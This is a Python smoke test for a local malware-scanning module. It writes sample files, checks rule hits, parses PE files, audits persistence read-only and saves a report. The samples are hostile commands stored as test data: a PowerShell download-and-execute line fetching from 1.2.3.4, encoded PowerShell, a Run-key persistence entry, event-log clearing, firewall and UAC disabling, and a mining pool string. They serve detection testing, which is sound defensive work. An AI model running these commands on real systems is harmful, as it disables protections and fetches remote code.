# -*- coding: utf-8 -*-
"""guard_core 冒烟：PE 解析真实文件 + 规则命中假样本 + 评分 + 报告。"""
import json
import os
import sys

sys.path.insert(0, r"F:\WhaleGirlPet\app")
import guard_core as g  # noqa: E402

ROOT = r"F:\WhaleGirlPet"
SAMPLES = os.path.join(ROOT, "tools", "_guard_samples")


def build_samples():
    os.makedirs(SAMPLES, exist_ok=True)
    cases = {
        "ps_enc.ps1": "powershell -NoP -NonI -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
                      "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGcAUwB0AHIAaQBuAGcAKAAnAGgA"
                      "dAB0AHA6AC8ALwB4AC8AeQAnACkA", 
        "rat.ps1": "IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a.ps1'); "
                   "keylog start; screenshot capture",
        "persist.cmd": "cmd /c powershell -windowstyle hidden -Command "
                       "\"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
        "b64.js": "var x='" + "QUJD" * 40 + "';",
        "miner.txt": "stratum+tcp://xmr.pool:3333 wallet=4xxx",
        "clean.ps1": "Write-Host 'hello world'; Get-Date",
        "log_clear.ps1": "wevtutil cl Security; Clear-EventLog -LogName System",
        "fw_off.cmd": "netsh advfirewall set allprofiles state off",
        "uac_off.cmd": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
                        "/v EnableLUA /t REG_DWORD /d 0 /f",
    }
    for fn, text in cases.items():
        with open(os.path.join(SAMPLES, fn), "w", encoding="utf-8") as f:
            f.write(text)
    return SAMPLES


def main():
    d = build_samples()
    print("样本目录:", d, "文件:", os.listdir(d))
    rules = g.load_rules()
    print("规则条数:", len(rules))

    # 1) PE 解析：自己的 exe / 系统 dll
    for p in [os.path.join(ROOT, ".venv", "Scripts", "python.exe"),
              r"C:\Windows\System32\notepad.exe",
              r"C:\Windows\System32\kernel32.dll"]:
        if os.path.exists(p):
            info = g.pe_info(p)
            print(f"PE {os.path.basename(p)}: is_pe={info.get('is_pe')} 64={info.get('is64')} "
                  f"节={len(info.get('sections') or [])} 签名目录={info.get('signed_dir')} "
                  f"WX={info.get('writable_exec_sections')} 高熵={info.get('high_entropy_sections')}")

    # 2) 规则命中
    for fn in os.listdir(d):
        f = os.path.join(d, fn)
        hits = g.scan_file(f, rules)
        print(f"  样本 {fn}: {len(hits)} 条 -> "
              + ", ".join(f"{h['rule']}/{h['level']}/{h['score']}" for h in hits))

    # 3) 持久化审计（只读）
    items = g.audit_persistence()
    kinds = {}
    for it in items:
        kinds[it["kind"]] = kinds.get(it["kind"], 0) + 1
    print("持久化点:", kinds, "共", len(items))
    judged = g.judge_persistence(items, rules)
    top = sorted(judged, key=lambda x: -x["score"])[:5]
    for t in top:
        print(f"  风险 {t['score']:>3} {t['level']:<6} {t['kind']:<8} {os.path.basename(t['target'])[:40]:<40} {t['why'][:60]}")

    # 4) 评分与报告
    f_all = []
    for fn in os.listdir(d):
        f_all += g.scan_file(os.path.join(d, fn), rules)
    score = g.score_of(f_all)
    print("样本合计评分:", score, "等级:", g.level_of(score))
    rep = {"checked_at": "2026-11-25 20:30:00", "score": score, "level": g.level_of(score),
           "counts": {"high": sum(1 for x in f_all if x["level"] == "high"),
                      "medium": sum(1 for x in f_all if x["level"] == "medium"),
                      "low": sum(1 for x in f_all if x["level"] == "low"),
                      "info": sum(1 for x in f_all if x["level"] == "info")},
           "findings": f_all, "persistence": judged, "files_scanned": 6,
           "rules": len(rules), "errors": [], "elapsed_s": 0.4,
           "mode": "只读研判，未删除/未隔离任何文件"}
    out = g.save_report(rep)
    print("报告落盘:", out)
    if out.get("md"):
        print("md 前 3 行:", open(out["md"], encoding="utf-8").read().splitlines()[:3])
    print("MpCmdRun:", g.mpcmdrun_path() or "（没找到）")


if __name__ == "__main__":
    main()
